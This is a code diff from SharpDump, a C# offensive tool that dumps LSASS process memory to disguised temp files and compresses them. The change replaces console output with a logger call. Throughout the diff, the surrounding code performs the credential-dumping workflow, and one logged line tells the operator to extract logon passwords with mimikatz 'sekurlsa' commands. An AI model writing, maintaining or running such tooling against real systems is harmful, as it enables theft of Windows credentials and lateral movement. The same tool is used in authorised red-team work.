@@ -67,14 +67,14 @@ namespace SharpDump.Logic
                 catch (Exception ex)
                 {
                     // often errors if we can't get a handle to LSASS
-                    Console.WriteLine(String.Format("\n[X]Exception: {0}\n", ex.Message));
+                    logger.Log(String.Format("\n[X]Exception: {0}\n", ex.Message));
                     return;
                 }
             }
 
             if (targetProcess.ProcessName == "lsass" && !IsHighIntegrity())
             {
-                Console.WriteLine("\n[X] Not in high integrity, unable to MiniDump!\n");
+                logger.Log("\n[X] Not in high integrity, unable to MiniDump!\n");
                 return;
             }
 
@@ -85,7 +85,7 @@ namespace SharpDump.Logic
             }
             catch (Exception ex)
             {
-                Console.WriteLine(String.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
+                logger.Log(String.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
                 return;
             }
             bool bRet = false;
@@ -94,7 +94,7 @@ namespace SharpDump.Logic
             string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
             string zipFile = String.Format("{0}\\Temp\\debug{1}.bin", systemRoot, targetProcessId);
 
-            Console.WriteLine(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));
+            logger.Log(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));
 
             using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
             {
@@ -104,14 +104,14 @@ namespace SharpDump.Logic
             // if successful
             if (bRet)
             {
-                Console.WriteLine("[+] Dump successful!");
-                Console.WriteLine(String.Format("\n[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));
+                logger.Log("[+] Dump successful!");
+                logger.Log(String.Format("\n[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));
 
                 Compress(logger, dumpFile, zipFile);
 
-                Console.WriteLine(String.Format("[*] Deleting {0}", dumpFile));
+                logger.Log(String.Format("[*] Deleting {0}", dumpFile));
                 File.Delete(dumpFile);
-                Console.WriteLine("\n[+] Dumping completed. Rename file to \"debug{0}.gz\" to decompress.", targetProcessId);
+                logger.Log("\n[+] Dumping completed. Rename file to \"debug{0}.gz\" to decompress.", targetProcessId);
 
                 string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
                 string OS = "";
@@ -123,14 +123,14 @@ namespace SharpDump.Logic
 
                 if (pid == -1)
                 {
-                    Console.WriteLine(String.Format("\n[*] Operating System : {0}", OS));
-                    Console.WriteLine(String.Format("[*] Architecture     : {0}", arch));
-                    Console.WriteLine(String.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
+                    logger.Log(String.Format("\n[*] Operating System : {0}", OS));
+                    logger.Log(String.Format("[*] Architecture     : {0}", arch));
+                    logger.Log(String.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
                 }
             }
             else
             {
-                Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
+                logger.Log(String.Format("[X] Dump failed: {0}", bRet));
             }
         }
 
